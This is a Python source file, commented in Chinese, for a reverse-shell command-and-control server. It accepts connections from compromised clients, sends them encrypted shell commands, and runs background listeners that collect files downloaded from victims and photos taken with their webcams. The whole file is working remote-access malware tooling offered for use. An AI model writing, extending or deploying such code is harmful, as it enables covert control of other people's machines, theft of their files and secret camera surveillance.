import socket
import time
import os
import threading
import file_trans
import cam
import settings
import cry

#反弹shell服务端


clients = {} # 在线客户端字典，键是客户端地址，值是客户端套接字

print("| '__/ _ \\ \\ / / _ \\ '__/ __|/ _ \\")
print("| | |  __/\\ V /  __/ |  \\__ \\  __/")
print("|_|  \\___| \\_/ \\___|_|  |___/\\___|")
print(" ___| |__   ___| | |")
print("/ __| '_ \\ / _ \\ | |")
print("\\__ \\ | | |  __/ | |")
print("|___/_| |_|\\___|_|_|")
print("************* Server等待连接,1000秒后超时,exit退出 *************")
print("************* cd切换路径，get+路径下载文件，camera拍照 *************")
HostPort = (settings.get_host(), settings.get_port())
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(HostPort)
server_socket.listen(5)
server_socket.settimeout(1000)  # 设置超时时间1000秒

clients_lock = threading.Lock()  # 创建一个锁对象
def server_receive():
    while True:
        client_socket, client_addr = server_socket.accept()
        print("\n客户端 ", client_addr, " 已连接")


        client_info = (client_socket, client_addr) # 创建一个包含套接字和客户端地址的元组

        with clients_lock: # 使用锁来保护对 clients 字典的访问
            clients[client_addr] = client_socket  # 添加键值对到字典clients，键是客户端地址，值是客户端套接字
        # print('当前客户端列表： ', clients.keys())
        
        # 新建一个server_receive_result线程，传 client_info 元组元组进去，每收到新连接的客户端，就新建一个线程接收消息，当客户端断开也能触发 except 从 clients 字典中删除
        def server_receive_result(client_info):
            client_socket, client_addr = client_info  # 解包元组为 套接字，客户端地址
            try:
                while True:
                    # 接收内容
                    result = client_socket.recv(10240).decode()  # 解码接受
                    decrypted_result = cry.decrypt(result,settings.get_key())
                    print(decrypted_result)
                    if not result:
                        print("\n客户端无返回数据")
                        break
            except:
                print("\n服务器接收异常")
                with clients_lock:  # 使用锁来保护对 clients 字典的访问
                    if client_addr in clients:  # 如果当前地址在字典中
                        del clients[client_addr]
                        client_socket.close()
                        print(f"\n客户端断开连接 {client_addr}")
                        return
        # 新建一个server_receive_result线程，传 client_info 元组元组进去，每收到新连接的客户端，就新建一个线程接收消息，当客户端断开也能触发 except 从 clients 字典中删除
        thread_server_listen = threading.Thread(target=server_receive_result,args=(client_info,))
        thread_server_listen.start()






def start_server():
    client_addr = None  # 定义一个值为None的client_addr防止空值报错
    while True:
        try:
            print('\n当前客户端列表： ', clients.keys())
            target_addr_input = input("\n输入ip，端口和消息选择一个客户端发送 (格式: ip:port)>>>")
            ip, port = target_addr_input.split(':')  # 把输入的地址分为ip和端口
            client_addr = (ip, int(port)) # 把ip和端口组合成client_addr
            # 如果输入的client_addr在clients字典里（clients字典里是已建立连接的客户端）
        except:
            print("\n输入格式错误")
        if client_addr in clients:
            print(client_addr,"\n输入的地址在已连接的客户端字典中")
            # clients[client_addr] 为client_socket套接字
            while True:
                try:
                    command_input = input('>>> ').strip()
                    if command_input=="": #输入为空
                        print("\n命令不能为空")
                    elif command_input == "exit":
                        print('\n当前客户端列表： ',clients.keys())
                        break # 如果输入了exit，跳出当前输入命令的循环，进入选择客户端的循环
                    else:
                        try:
                            encrypted_command = cry.encrypt(command_input, settings.get_key())
                            clients[client_addr].send(encrypted_command.encode('utf-8'))  # 编码发送
                        except Exception as e:
                            print("服务器发送异常" + str(e))
                except Exception as e:
                    print("\n服务器异常"+ str(e))

    s.close()

def wait_for_file():
    while True:
        file_trans.recv_file_server(settings.get_host(), settings.get_file_port())
def wait_for_cam():
    while True:
        cam.get_cam_image(settings.get_host(), settings.get_cam_port())

if __name__ == '__main__':





    thread_get_file = threading.Thread(target=wait_for_file)
    thread_get_file.start()

    thread_get_cam = threading.Thread(target=wait_for_cam)
    thread_get_cam.start()

    thread_start_server = threading.Thread(target=start_server)
    thread_start_server.start()

    thread_server_listen = threading.Thread(target=server_receive) #接收客户端，添加到列表
    thread_server_listen.start()


